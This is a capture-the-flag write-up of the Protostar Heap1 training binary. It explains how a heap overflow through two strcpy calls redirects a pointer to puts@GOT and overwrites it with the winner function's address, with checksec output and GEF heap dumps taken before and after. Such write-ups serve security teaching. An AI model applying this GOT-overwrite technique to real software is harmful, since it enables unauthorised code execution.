# Protostar - Heap1
A heap overflow overwriting a pointer in a structure. We have to call the function **winner**.

## Binary
### Code
Decompiled with Binary Ninja HLIL.

![](img/main_hlil.png)

### Security 
Only NX enabled.

```shell
$ checksec ./heap1
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Solution
Overwrite **puts@GOT** with pointer to **winner** function.

#### Heap chunks
We have four chunks of size 0x10
```shell
gef➤  dereference 0x0804b1a0-8 16
0x0804b198│+0x0000: 0x00000000
0x0804b19c│+0x0004: 0x00000011
0x0804b1a0│+0x0008: 0x00000001
0x0804b1a4│+0x000c: 0x0804b1b0  →  "AAAA"
0x0804b1a8│+0x0010: 0x00000000
0x0804b1ac│+0x0014: 0x00000011
0x0804b1b0│+0x0018: "AAAA"
0x0804b1b4│+0x001c: 0x00000000
0x0804b1b8│+0x0020: 0x00000000
0x0804b1bc│+0x0024: 0x00000011
0x0804b1c0│+0x0028: 0x00000002
0x0804b1c4│+0x002c: 0x0804b1d0  →  "BBBB"
0x0804b1c8│+0x0030: 0x00000000
0x0804b1cc│+0x0034: 0x00000011
0x0804b1d0│+0x0038: "BBBB"
0x0804b1d4│+0x003c: 0x00000000
```
Two chunks contain a pointer to another chunk used as the destination in **strcpy**.

We use the first **strcpy** to overwrite the destination of the second **strcpy** and point it to **puts@GOT**.

We use the second **strcpy** to overwrite **puts@GOT** with the address of our **winner** function. That way when puts gets called for the first time it executes **winner**.

So for the first **strcpy** we need a padding of 0x10 (distance to the next chunk data) plus 0x4 (size of first part of data containing an int). And then we the address of **puts@GOT**.

For the second **strcpy** we just have to give it the address of our **winner** function.

### Heap chunks after overflow
```shell
gef➤  dereference 0x098951a0-8 16
0x09895198│+0x0000: 0x00000000
0x0989519c│+0x0004: 0x00000011
0x098951a0│+0x0008: 0x00000001
0x098951a4│+0x000c: 0x098951b0  →  0x61616161
0x098951a8│+0x0010: 0x00000000
0x098951ac│+0x0014: 0x00000011
0x098951b0│+0x0018: 0x61616161
0x098951b4│+0x001c: 0x61616162
0x098951b8│+0x0020: 0x61616163
0x098951bc│+0x0024: 0x61616164
0x098951c0│+0x0028: 0x61616165
0x098951c4│+0x002c: 0x0804a018  →  0x080484b6  →  <winner+0> push ebp
0x098951c8│+0x0030: 0x00000000
0x098951cc│+0x0034: 0x00000011
0x098951d0│+0x0038: 0x00000000
0x098951d4│+0x003c: 0x00000000
```